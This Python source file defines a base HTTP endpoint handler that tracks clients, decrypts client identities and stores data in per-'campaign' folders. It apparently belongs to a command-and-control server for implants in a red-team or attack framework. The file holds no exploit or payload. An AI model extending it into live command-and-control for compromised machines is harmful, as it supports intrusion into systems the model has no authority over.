import os
import logging
import json

logger = logging.getLogger(__name__)

class BaseHandler:
    """Base class for all endpoint handlers with common functionality"""
    
    def __init__(self, request_handler, client_manager, crypto_helper, client_helper, path_router):
        """
        Initialize the base handler
        
        Args:
            request_handler: The HTTP request handler instance
            client_manager: Client manager for tracking clients
            crypto_helper: Helper for encryption/decryption
            client_helper: Helper for client operations
            path_router: Path router for URL handling
        """
        self.request_handler = request_handler
        self.client_manager = client_manager
        self.crypto_helper = crypto_helper
        self.client_helper = client_helper
        self.path_router = path_router
        self.client_address = request_handler.client_address
        self.headers = request_handler.headers
        self.server = request_handler.server
        
    def log_message(self, message):
        """Log a message with client IP"""
        logger.info(f"{self.client_address[0]} - {message}")
    
    def send_response(self, status_code, content_type, content, headers=None):
        """
        Send HTTP response with standard headers
        
        Args:
            status_code: HTTP status code
            content_type: Content type for the response
            content: Response body content
            headers: Additional headers dict (optional)
        """
        self.request_handler.send_response(status_code)
        self.request_handler.send_header("Content-type", content_type)
        
        # Add common cache control headers used by web servers
        self.request_handler.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.request_handler.send_header("Pragma", "no-cache")
        self.request_handler.send_header("Expires", "0")
        
        # Add any additional headers
        if headers:
            for key, value in headers.items():
                self.request_handler.send_header(key, value)
                
        self.request_handler.end_headers()
        
        # Send content
        if isinstance(content, str):
            content = content.encode("utf-8")
        self.request_handler.wfile.write(content)
    
    def send_success_response(self, additional_headers=None):
        """Send a standard success response"""
        headers = additional_headers or {}
        self.send_response(200, "text/plain", b"OK", headers)
    
    def send_error_response(self, status_code=500, message="Server Error"):
        """Send an error response"""
        self.send_response(status_code, "text/plain", message)
    
    def get_campaign_folder(self):
        """Get the current campaign folder path"""
        campaign_name = getattr(self.request_handler, 'campaign_name', None)
        
        if not campaign_name:
            # Try to find campaign directories
            campaign_dirs = [d for d in os.listdir() if d.endswith("_campaign") and os.path.isdir(d)]
            if campaign_dirs:
                campaign_name = campaign_dirs[0][:-9]  # Remove "_campaign" suffix
            else:
                campaign_name = "default"
        
        return f"{campaign_name}_campaign"
    
    def identify_client(self):
        """
        Identify client through decryption
        
        This is a placeholder that should be overridden by handlers 
        that need to identify clients through key-based decryption
        """
        # This will be implemented by specific handlers
        return None